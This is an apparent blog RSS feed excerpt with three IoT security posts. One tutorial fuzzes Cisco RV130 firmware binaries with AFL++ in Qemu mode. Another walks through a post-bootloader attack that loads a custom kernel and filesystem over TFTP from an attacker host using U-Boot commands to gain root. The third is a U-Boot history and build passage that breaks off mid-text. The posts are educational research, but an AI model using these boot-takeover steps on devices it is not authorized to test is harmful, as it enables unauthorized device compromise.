      <content:encoded><![CDATA[<blockquote>American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code.</blockquote><img src="https://blog.attify.com/content/images/2022/01/titleimage.png" alt="Fuzzing IoT binaries with AFL++ - Part I"><p>AFL lives at <a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a>. It hasn&apos;t been updated in a while. While AFL still works fine, there&apos;s a new project AFL++, a fork of AFL with lots of improvements and new features. AFL++ can be found at <a href="https://aflplus.plus/">https://aflplus.plus/</a> with its source on <a href="https://github.com/AFLplusplus/AFLplusplus">GitHub</a>. In this article, we will look at using AFL++ to fuzz IoT binaries.</p><p>Fuzzing works best when we have the source code of the binary in question. Unfortunately for IoT binaries, this is often not the case. AFL++ (and AFL) ships with a companion tool (afl-gcc, afl-clang etc) that works as a drop-in replacement to gcc, clang, or any other standard build tool. The tool is used to inject instrumentation in the generated binaries while compiling the source code. The instrumented binaries can then be fuzzed using afl-fuzz.</p><p>Fuzzing closed source applications is tricky. For fuzzing such binaries, AFL++ can use Qemu, unicorn, or Frida and are named as qemu mode, unicorn mode, and Frida mode respectively. These are binary-only instrumentation modes and are not as efficient as the source code instrumentation modes. We will be using Qemu mode in this article.</p><p>In Qemu mode, AFL++ uses qemu user mode emulation to run the binary. It uses a modified version of Qemu which instruments the basic blocks as the program executes. The instrumentation information thus generated is used to generate new test cases which trigger different code paths improving code coverage. AFL++ in qemu mode can also be used to instrument foreign arch binaries (like an arm binary on an x86_64 host). This is extremely useful for fuzzing IoT firmware binaries which are usually of ARM or MIPS architecture.</p><p>An important point to note is that AFL++ and similar fuzzers (AFL, <a href="https://github.com/google/honggfuzz">hongfuzz</a>, <a href=" https://gitlab.com/akihe/radamsa">radamsa</a><em>[test case generator only]</em>) only work with file inputs That is the program must only receive the fuzzed input from a file. Programs that take in input from a socket are not supported. </p><p>For fuzzing socket-based programs we can take either of the following approaches:</p><ul><li>If the source code of the application is available, rewrite the application to accept input from a file. Most of the time rewriting the entire application isn&#x2019;t necessary. We can code in a small test function that reads in a file and uses the data to call another function that we want to fuzz.</li><li>For closed source apps, rewriting the source isn&#x2019;t an option. In such cases, there are hacks to convert a socket&#x2019;ed binary to use files instead. These methods usually use LD_PRELOAD to override socket functions and make them read/write from a file instead. <a href="https://github.com/zardus/preeny">Preeny</a> and <a href="https://github.com/zyingp/desockmulti">desockmulti</a> are two such desocketing tools. However, these may not always work out of the box.</li></ul><h2 id="compiling-afl">Compiling AFL++</h2><p>AFL++ can be compiled on any Linux system. Here we are using an Ubuntu 20.04 LXD container. The steps are as follows:</p><pre><code class="language-shell">$ sudo apt update
$ sudo apt install git make build-essential clang ninja-build pkg-config libglib2.0-dev libpixman-1-dev
$ git clone https://github.com/AFLplusplus/AFLplusplus
$ cd AFLplusplus/
$ make all
$ cd qemu_mode
$ CPU_TARGET=arm ./build_qemu_support.sh</code></pre><h2 id="fuzzing-simple-iot-binaries">Fuzzing simple IoT binaries</h2><p>We will be using a firmware for the Cisco RV130 VPN router which can be downloaded from <a href="https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.55?i=!pp">https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.55?i=!pp</a>. The file is named <em>RV130X_FW_1.0.3.55.bin</em></p><p>After extracting the binary using binwalk the extracted file system looks like</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2022/01/image.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="684" height="439" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image.png 600w, https://blog.attify.com/content/images/2022/01/image.png 684w"><figcaption>Extracted filesystem of Cisco RV130X firmware binary</figcaption></figure><p>We will be looking at fuzzing the <em>jsonparse</em> and <em>xmlparser1</em> binary in <em>/usr/sbin/</em>. These programs accept input from a file and are ideal for fuzzing. We don&#x2019;t have the source available so we have to use Qemu mode.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-1.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="953" height="492" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-1.png 600w, https://blog.attify.com/content/images/2022/01/image-1.png 953w" sizes="(min-width: 720px) 720px"></figure><h2 id="fuzzing-xmlparser1">Fuzzing xmlparser1</h2><p>Before fuzzing we need to know how the program accepts input. Running <em>xmlparser1</em> with <em>qemu-arm-static</em> with the &#x2013;help parameter shows the usage. It accepts a filename with the -f parameter. The -d parameter stands for debug.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-2.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1237" height="72" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-2.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-2.png 1000w, https://blog.attify.com/content/images/2022/01/image-2.png 1237w" sizes="(min-width: 720px) 720px"></figure><p>We can create a <a href="https://pastebin.com/rDXcdURH">test XML file</a> and run <em>xmlparser1</em>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-3.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1362" height="425" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-3.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-3.png 1000w, https://blog.attify.com/content/images/2022/01/image-3.png 1362w" sizes="(min-width: 720px) 720px"></figure><p><em>xmlparser1</em> displays the parsed contents of the <em>test.xml</em> file. We may now proceed to fuzzing. To run the fuzzer we need to give an input file which the fuzzer will use to generate further test cases. We will specify <em>test.xml</em> as our input file.</p><p>Create two directories <em>input-xml</em> and <em>output-xml</em> and move the <em>test.xml</em> file to <em>input-xml</em> as shown.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-4.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="759" height="289" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-4.png 600w, https://blog.attify.com/content/images/2022/01/image-4.png 759w" sizes="(min-width: 720px) 720px"></figure><p>We can now launch <em>afl-fuzz</em></p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-6.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1097" height="79" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-6.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-6.png 1000w, https://blog.attify.com/content/images/2022/01/image-6.png 1097w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-shell">$ QEMU_LD_PREFIX=./squashfs-root/ ../AFLplusplus/afl-fuzz \
            -Q \
            -i input-xml/ \
            -o output-xml/ \
            -- ./squashfs-root/usr/sbin/xmlparser1 -f @@</code></pre><p>The options are explained below:</p><ul><li>-Q: Use AFL++ in Qemu mode</li><li>-i: The path to the input directory</li><li>-o: The path to the output directory. This directory will contain files that trigger an interesting behavior on the binary such as a crash or hang</li></ul><p>Everything after the double hyphen (--) specifies the target program to run along with its arguments. The @@ parameter stands for the filename. At runtime, AFL++ will replace the @@ parameter with the name of the input file.</p><p>The fuzzing session starts as shown below. We can press Ctrl+C anytime to exit.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-7.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="810" height="576" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-7.png 600w, https://blog.attify.com/content/images/2022/01/image-7.png 810w" sizes="(min-width: 720px) 720px"></figure><p>In our brief test, AFL++ wasn&#x2019;t able to crash the application.</p><h2 id="fuzzing-jsonparse">Fuzzing jsonparse</h2><p>Jsonparse is a similar binary but it parses JSON files instead of XML. Running the program without any arguments displays its usage.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-8.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="818" height="789" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-8.png 600w, https://blog.attify.com/content/images/2022/01/image-8.png 818w" sizes="(min-width: 720px) 720px"></figure><p>We can create a <a href="https://pastebin.com/XNYEQwhu">test JSON file</a> and run jsonparser on it.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-9.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1024" height="627" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-9.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-9.png 1000w, https://blog.attify.com/content/images/2022/01/image-9.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>We can use the same <em>test.json</em> file as input to the fuzzer. In a similar way, create two directories named <em>input-json</em> and <em>output-json</em> with <em>test.json</em> in directory <em>input-json</em>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-10.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="779" height="255" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-10.png 600w, https://blog.attify.com/content/images/2022/01/image-10.png 779w" sizes="(min-width: 720px) 720px"></figure><p>We can run the fuzzer as shown:</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-11.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1173" height="70" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-11.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-11.png 1000w, https://blog.attify.com/content/images/2022/01/image-11.png 1173w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-shell">$ QEMU_LD_PREFIX=./squashfs-root/ ../AFLplusplus/afl-fuzz \
            -Q \
            -i input-json / \
            -o output-json / \
            -- ./squashfs-root/usr/sbin/jsonparser @</code></pre><p>After fuzzing for a couple of minutes, there are two unique crashes already.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-12.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="809" height="576" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-12.png 600w, https://blog.attify.com/content/images/2022/01/image-12.png 809w" sizes="(min-width: 720px) 720px"></figure><p>Let&#x2019;s explore the <em>output-json</em> directory to have a look at the files which crashed <em>jsonparser</em>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-13.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="974" height="657" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-13.png 600w, https://blog.attify.com/content/images/2022/01/image-13.png 974w" sizes="(min-width: 720px) 720px"></figure><p>The two files which triggered the crashes are in the <em>output-json/default/crashes</em> directory.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-14.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1081" height="98" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-14.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-14.png 1000w, https://blog.attify.com/content/images/2022/01/image-14.png 1081w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-15.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="1147" height="95" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-15.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-15.png 1000w, https://blog.attify.com/content/images/2022/01/image-15.png 1147w" sizes="(min-width: 720px) 720px"></figure><p>To cross-check, we can run <em>jsonparser</em> with one of the generated files.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-16.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part I" loading="lazy" width="912" height="139" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-16.png 600w, https://blog.attify.com/content/images/2022/01/image-16.png 912w" sizes="(min-width: 720px) 720px"></figure><p><em>Jsonparser</em> indeed crashes with a segfault. From here on, the next steps are to identify the root cause of the bug and check if it&apos;s exploitable. Not all crashes are exploitable. Triaging the crash is out of the scope of this post.</p><p>In the next part, we will be looking at how to fuzz socketed binaries. These programs accept input over the network and not from a regular file. For any comments or suggestions feel free to leave a comment below. </p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[To Boot Or Not To Boot – Practical Attack Vector]]></title>
      <description><![CDATA[Learn step-by-step how to exploit Bootloaders using Practical attack vectors. Gain root access by loading custom kernel and filesystem using TFTP.]]></description>
      <link>https://blog.attify.com/to-boot-or-not-to-boot-practical-attack-vector/</link>
      <guid isPermaLink="false">61a8c5de569bff0048e6b197</guid>
      <category><![CDATA[bootloader]]></category>
      <category><![CDATA[firmware]]></category>
      <category><![CDATA[iot]]></category>
      <dc:creator><![CDATA[Victor Hanna]]></dc:creator>
      <pubDate>Fri, 03 Dec 2021 05:07:52 GMT</pubDate>
      <media:content url="https://images.unsplash.com/photo-1553341640-6b28ff92098a?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MnwxMTc3M3wwfDF8c2VhcmNofDN8fGlvdCUyMGhhY2tlZHxlbnwwfHx8fDE2Mzg0NTE0NzE&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" medium="image" />
      <content:encoded><![CDATA[<h2 id="introduction"><a><u>I</u>ntroduction</a></h2><img src="https://images.unsplash.com/photo-1553341640-6b28ff92098a?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MnwxMTc3M3wwfDF8c2VhcmNofDN8fGlvdCUyMGhhY2tlZHxlbnwwfHx8fDE2Mzg0NTE0NzE&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector"><p>In this post, we will be completing the loop on our three-part series by describing a specific attack vector that is available upon successful bypass of the bootloader process.</p><p>Once landed within the Das U-Boot prompt, an attacker is able to surge forward to ultimately take over the device that underlies it. &#xA0;As our attack vector, we will be looking at using TFTP to load a kernel and filesystem of our own onto the affected target. &#xA0;We will look at how to first set up the attack device and then ultimately try our hand at gaining root access to our target device.</p><h2 id="what-is-tftp"><a><strong>What is TFTP</strong></a></h2><p>TFTP or Trivial File Transfer Protocol is a protocol whose use is quite ubiquitous due to its ease of use and great utility. Its main usage is to retrieve or transmit a file between compatible devices. This protocol uses UDP, meaning that it is stateless and typically runs over port 69. It is used for the transferring of files without the overhead one would expect with the use of a TCP-based protocol. Based on this efficiency it is typically considered the file transfer protocol of choice. One main drawback of TFTP is the lack of retransmission in the event that packets are lost over a network segment.</p><h2 id="pre-requisite-state"><a><strong>Pre-requisite State</strong></a></h2><p>In order for this particular attack vector to be fully realized and enacted, a specific state of play is required to be in place.</p><p>1. Breaking of the Bootloader Process</p><p>2. Access to the U-Boot prompt</p><p>3. A network segment that an attacker can co-opt, one of which is shared with the target device</p><p>4. Preload/Prebuilt Kernel, Filesystem, and Device Tree files</p><p>With the above in place, we are ready to kick off the proceedings!</p><h2 id="breaking-it-down"><a><strong>Breaking it down</strong></a></h2><p>As we described in Part One and Two of the series, it is possible to interrupt the bootloader process in order to gain access to an intermediary stage within the boot process itself. We used the U-Boot example in our case to help illustrate a typical case scenario. Once access to the U-Boot prompt is gained we are then ready to forge further attacks. &#xA0;Casting your mind back to Part Two of the series, we remember that the U-Boot prompt has a vernacular/syntax of its own and it is this very syntax that we will be using to further our cause.</p><p>The specific vector that we have chosen for this blog, is the utilization of the TFTP protocol to assist in circumventing the intended boot process. In essence, we will look to bypass the hardened firmware image and supplant one of our own.</p><p>A practical use case for this type of attack is surprisingly common, as most vendors and/or companies utilize this type of approach for remote upgrades and hence the vector itself can typically fly under the radar using tools and mechanisms that are frequently available. This allows an attack to &#x201C;<em>live off the land</em>&#x201D; without the need to implement foreign toolsets.</p><h2 id="required-files"><a><strong>Required Files</strong></a></h2><p>In order to fully actualize the end result, we will build out the main three files required, in order that they are used to circumvent the intended boot process and finally allow for the takeover of the target device.</p><p>Following on from <strong>Part One</strong> and <strong>Part Two</strong> of this series we will further utilize <strong>buildroot</strong> to assist in the building of:</p><p>1. The Kernel (zImage)</p><p>2. The Filesystem (rootfs.cpio.uboot) <strong>AND</strong></p><p>3. The Device Tree Blob (versatilepb.dtb)</p><p>These three files are needed to successfully load the final image onto our target device.</p><h2 id="the-buildroot-process"><a><strong>The Buildroot Process</strong></a></h2><p>The buildroot process allows us to compile the necessary kernel, filesystem, and device tree that we will use for this attack.</p><p><strong>Buildroot Configuration</strong> </p><p>This takes us into the main configuration menu, which we will use to set all applicable options for our chosen architecture and platform.</p><p>Prior to commencement, we ensure a clean build by issuing the <em><strong>make clean</strong></em> command</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="194" height="28"></figure><p>We can then proceed to invoke the buildroot config menu by issuing the <strong><em>make menuconfig</em></strong> command</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-3.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="244" height="28"></figure><p>This will land us in the <strong>Buildroot Configuration Menu</strong>, which allows for the applicable configuration to take place.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/12/image-6.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="754" height="408" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-6.png 600w, https://blog.attify.com/content/images/2021/12/image-6.png 754w" sizes="(min-width: 720px) 720px"><figcaption>Figure 1. Buildroot Configuration Menu</figcaption></figure><p>Whilst here we will ensure the following configuration items are chosen.</p><p>- &#x2018;Target Options&#x2019; -&gt; &#x2018;Target Architecture (ARM (little endian))&#x2019;</p><p>- &#x2018;Networking Applications&#x2019; -&gt; &#x2018;OpenSSH&#x2019;</p><p>- &#x2018;Kernel&#x2019; -&gt; &#x2018;Kernel Binary Format&#x2019; -&gt; &#x2018;uImage&#x2019;</p><p>Once satisfied that these options are configured we can save the configuration and drop back to a shell.</p><p>From here we issue the <strong><em>make all</em> </strong>command and take the opportunity to enjoy a long overdue coffee break to allow buildroot to do its thing !</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-7.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="168" height="26"></figure><p>Once complete we should be left with the required files which allows us to move on to the next step.</p><h2 id="setting-up-the-attacking-platform"><a><strong>Setting up the attacking platform</strong></a></h2><p>In order to make this attack vector viable we need to setup and configure a host under attacker control. This device will host the required files and offer a TFTP service to any interested parties to gladly utilise.</p><p>Based on our chosen Debian flavored NIX* we go about setting up and configuring the HPA&apos;s tftp server.</p><p>Following outlines the installation and configuration:</p><p><strong>1. <em>sudo apt-get install tftpd-hpa</em></strong> &#x2013; Install the package</p><p><strong>2. <em>sudo service tftp-hpa start</em> - </strong>Start the service</p><p><strong>3. <em>cp zImage versatile-pb.dtb rootfs.cpio.uboot /var/lib/tftpboot</em></strong> - /var/lib/tftpboot is the root tftp directory and must contain any files you would like to transfer</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/12/image-8.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="768" height="400" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-8.png 600w, https://blog.attify.com/content/images/2021/12/image-8.png 768w" sizes="(min-width: 720px) 720px"><figcaption>Figure 2. Netstat shows service listening</figcaption></figure><h2 id="leveraging-u-boot"><a><strong>Leveraging U-Boot</strong></a></h2><p>Now that our attacking ecosystem is setup to accept incoming TFTP requests we will return to the U-Boot prompt that we are familiar with from the previous two blog posts, which looks something like this:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/12/image-9.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="902" height="148" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-9.png 600w, https://blog.attify.com/content/images/2021/12/image-9.png 902w" sizes="(min-width: 720px) 720px"><figcaption>Figure 3. U-Boot Prompt (version command issued)</figcaption></figure><p>We are now ready to start leveraging the U-Boot prompt and make it do our bidding.</p><p>Step 1. Examination of the DRAM structure in order to ascertain the correct load address for our kernel image. We are looking for the starting address.</p><p>- Issuing the <strong><em>bdinfo </em></strong>command provides us with this information denoted by the DRAM Bank start register.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/12/image-10.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="902" height="740" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-10.png 600w, https://blog.attify.com/content/images/2021/12/image-10.png 902w" sizes="(min-width: 720px) 720px"><figcaption>Figure 4. U-Boot Prompt (<b><i>bdinfo</i></b> command issued)</figcaption></figure><p>Step2. Configuration of the network layer in order to commence communications with our attackers TFTP server.</p><p>- Issuing the <strong><em>setenv ipaddr &lt;target device ip address&gt; </em></strong>and <strong><em>setenv serverip &lt;tftp ip address&gt;</em></strong>, allows us to build a layer 3 connection between the target device and the attackers TFTP server host.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-19.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="470" height="62"></figure><p>- To confirm communications we will ping the serverip, just for the completeness</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-11.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="384" height="90"></figure><p>Step 3. Copy the required files into specified DRAM locations using TFTP.</p><p>- Issuing the <strong><em>tftpboot</em></strong> <strong><em>&lt;loadaddress&gt; &lt;tftp server ip&gt;:[filename]</em></strong> allows for the transfer and subsequent loading of files into the target devices DRAM address space.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-12.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="848" height="792" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-12.png 600w, https://blog.attify.com/content/images/2021/12/image-12.png 848w" sizes="(min-width: 720px) 720px"></figure><p>Step 4. Boot the target device kernel image incorporating all load address attributes</p><p>- Issuing the <strong><em>bootz 0x41000000 0x42000000 0x41a00000 </em></strong>command boots the target system incorporating kernel, filesystem and device tree using their corresponding memory address ranges</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-13.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="786" height="736" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-13.png 600w, https://blog.attify.com/content/images/2021/12/image-13.png 786w" sizes="(min-width: 720px) 720px"></figure><p>Step 5. Enjoy newfound root privileges &#x2018;wOOt&#x2019;</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/12/image-14.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Practical Attack Vector" loading="lazy" width="824" height="124" srcset="https://blog.attify.com/content/images/size/w600/2021/12/image-14.png 600w, https://blog.attify.com/content/images/2021/12/image-14.png 824w" sizes="(min-width: 720px) 720px"></figure><h2 id="final-thoughts"><a><strong>Final Thoughts</strong></a></h2><p>As has been outlined in this three part series the boot process is made up of many moving parts, which if inappropriately handled can add up to a significant compromise if left unchecked and uncontrolled. &#xA0;We have attempted to scratch the surface of describing Bootloaders, Das U-Boot, and finally a Practical Attack Vector that is typically used by attackers to gain further footholds into such environments. &#xA0;The main takeaway of this blog series was to help illuminate how the understanding of somewhat simple concepts of the boot process sheds light on a more often overlooked compromise which in the day and age of the growing IoT universe gives further options to nefarious types that may be used to ultimately bypass and takeover target systems for no other purpose other than for the lulz.</p><p>We at <strong>Attify</strong> hope you have enjoyed this series. Stay tuned for a lot more to come !!!</p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[To Boot Or Not To Boot – Das U-Boot]]></title>
      <description><![CDATA[<h2></h2><h1 id="introduction">Introduction</h1><p>In this post, we will be describing the bootloader that goes by the name of Das U-Boot. We will delve into the following Das U-Boot features, including:</p><p>- Das U-Boot Origin Story</p><p>- The Building of Das U-Boot</p><p>- Running Das U-Boot in an emulator (QEMU)</p><p>- Das U-Boot</p>]]></description>
      <link>https://blog.attify.com/to-boot-or-not-to-boot-das-u-boot/</link>
      <guid isPermaLink="false">61965c7134687100481352da</guid>
      <dc:creator><![CDATA[Victor Hanna]]></dc:creator>
      <pubDate>Fri, 19 Nov 2021 19:28:18 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2021/11/U-boot.png" medium="image" />
      <content:encoded><![CDATA[<h2></h2><h1 id="introduction">Introduction</h1><img src="https://blog.attify.com/content/images/2021/11/U-boot.png" alt="To Boot Or Not To Boot &#x2013; Das U-Boot"><p>In this post, we will be describing the bootloader that goes by the name of Das U-Boot. We will delve into the following Das U-Boot features, including:</p><p>- Das U-Boot Origin Story</p><p>- The Building of Das U-Boot</p><p>- Running Das U-Boot in an emulator (QEMU)</p><p>- Das U-Boot command line</p><p>- Attacker Options</p><h1 id="u-boot-origin-story">U-Boot Origin Story</h1><p>This open-source project first sprang into existence as a bootloader for the embedded PowerPC architecture. In this guise, it was initially known as <strong>8xxROM</strong> and was later renamed to <strong>PPCBoot</strong>. Interestingly enough, the latter name, &apos;<strong>PPCBoot</strong>&apos;, was chosen somewhat based on the <strong>SourceForge</strong> restriction of digits being used in a project&apos;s name. <strong>PPCBoot&apos;s</strong> initial release was July 19, 2000. Further development saw a brief port of the bootloader to include ARM architecture through a project known as <strong>ARMBoot</strong> in 2002, with the end result being a merge back into <strong>PPCBoot</strong> in the same year. &#xA0;This collaboration saw the widening of the supported architectures. Later <strong>PPCBoot</strong> became <strong>U-Boot</strong> and was further widened to include x86 and MIPS architectures and by 2004 included support for 216 board manufacturers.</p><p>Fast-forwarding to the current day, U-Boot was renamed &apos;<strong>Das U-Boot</strong>&apos; where &apos;<strong>Das</strong>&apos; is the Germanic definitive article or simply &apos;<strong>The</strong>&apos; translated into English. The name was cleverly chosen as a play on words based around the German submarine film &apos;<strong>Das Boot</strong>&apos;, which takes place in World War II on a German <strong>U-Boat</strong>.</p><h1 id="the-building-of-das-u-boot">The Building of Das U-Boot</h1><p>To build U-Boot, the first requirement is to obtain the source code. &#xA0;This can be achieved in numerous ways, however, we like the cloning of the .git archive as our preferred method:</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture1.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="228" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture1.png 600w, https://blog.attify.com/content/images/2021/11/Picture1.png 902w" sizes="(min-width: 720px) 720px"></figure><p>For the purposes of our discussion and subsequent practical examples, we will choose to build U-Boot across an emulated environment that is using <strong>qemu-arm</strong>. To gather our bearings, we can conduct a quick grep through the <strong>board</strong> directory to gather our bearings to find an appropriate configuration file.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture2.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="54" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture2.png 600w, https://blog.attify.com/content/images/2021/11/Picture2.png 902w" sizes="(min-width: 720px) 720px"></figure><p>With the above clue on hand, we can then further the search through examination of the <strong>MAINTAINERS</strong> file within the same directory, which leads us to the crown jewels, that is, the appropriate &apos;<em><strong>defconfig</strong></em>&apos; file that we will use for our build.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture3.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="644" height="188" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture3.png 600w, https://blog.attify.com/content/images/2021/11/Picture3.png 644w"></figure><p>Using &apos;<strong>make clean</strong>&apos; ensures a clean build distribution and writes the required <strong>.config</strong> file later used to build the U-Boot image.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture4.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="604" height="336" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture4.png 600w, https://blog.attify.com/content/images/2021/11/Picture4.png 604w"></figure><p>We now specify the required Cross Compiler and Architecture environment variables and before proceeding onto the <strong>make </strong>process</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture5.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="842" height="86" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture5.png 600w, https://blog.attify.com/content/images/2021/11/Picture5.png 842w" sizes="(min-width: 720px) 720px"></figure><p>We should now be left with a u-boot image, which we can now execute using QEMU.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture6.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="756" height="60" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture6.png 600w, 